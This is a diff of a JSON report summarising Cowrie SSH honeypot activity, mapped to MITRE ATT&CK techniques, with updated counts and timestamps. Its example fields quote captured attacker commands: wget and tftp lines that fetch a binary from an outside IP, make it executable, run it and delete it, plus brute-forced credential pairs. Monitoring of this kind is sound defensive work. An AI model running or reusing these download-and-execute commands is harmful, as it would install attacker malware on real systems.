@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 04:03:44",
+  "generated": "2026-08-29 05:03:10",
   "totals": {
-    "commands": 134,
-    "login_failed": 197,
-    "login_success": 19,
-    "sessions": 275
+    "commands": 166,
+    "login_failed": 247,
+    "login_success": 23,
+    "sessions": 347
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 197,
+      "count": 247,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,46 +21,14 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T04:00:03.800608Z",
-      "unique_ips": 22
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 19,
-      "examples": [
-        "root / 123@@@",
-        "ubuntu / ubuntu",
-        "root / zlxx.",
-        "root / root",
-        "admin / 12345"
-      ],
-      "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T03:53:44.811767Z",
-      "unique_ips": 15
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 19,
-      "examples": [
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
-      ],
-      "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T03:08:15.987989Z",
-      "unique_ips": 3
+      "last": "2026-08-29T05:01:56.539024Z",
+      "unique_ips": 27
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 17,
+      "count": 31,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -69,8 +37,40 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-29T02:21:36.689252Z",
-      "last": "2026-08-29T03:08:15.987989Z",
-      "unique_ips": 2
+      "last": "2026-08-29T04:57:15.662099Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 23,
+      "examples": [
+        "root / 123@@@",
+        "ubuntu / ubuntu",
+        "root / zlxx.",
+        "root / root",
+        "admin / 12345"
+      ],
+      "first": "2026-08-29T00:22:29.262232Z",
+      "last": "2026-08-29T04:57:40.676605Z",
+      "unique_ips": 18
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 22,
+      "examples": [
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
+      ],
+      "first": "2026-08-29T00:23:05.332392Z",
+      "last": "2026-08-29T04:57:15.662099Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
@@ -88,13 +88,13 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-29T03:07:39.054930Z",
-      "last": "2026-08-29T03:07:39.054930Z",
-      "unique_ips": 1
+      "last": "2026-08-29T04:57:10.326527Z",
+      "unique_ips": 2
     },
     {
       "id": "T1562.004",
@@ -116,39 +116,39 @@
     ],
     [
       "system",
-      7
+      9
     ],
     [
       "shell",
-      7
+      9
     ],
     [
       "sh",
-      7
-    ],
-    [
-      "enable",
-      6
-    ],
-    [
-      "linuxshell",
-      6
-    ],
-    [
-      "ping ;sh",
-      4
-    ],
-    [
-      "enablelinuxshell",
-      3
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      3
+      9
     ],
     [
       "/bin/busybox",
-      3
+      8
+    ],
+    [
+      "enable",
+      7
+    ],
+    [
+      "linuxshell",
+      7
+    ],
+    [
+      "ping ;sh",
+      5
+    ],
+    [
+      "enablelinuxshell",
+      4
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      4
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
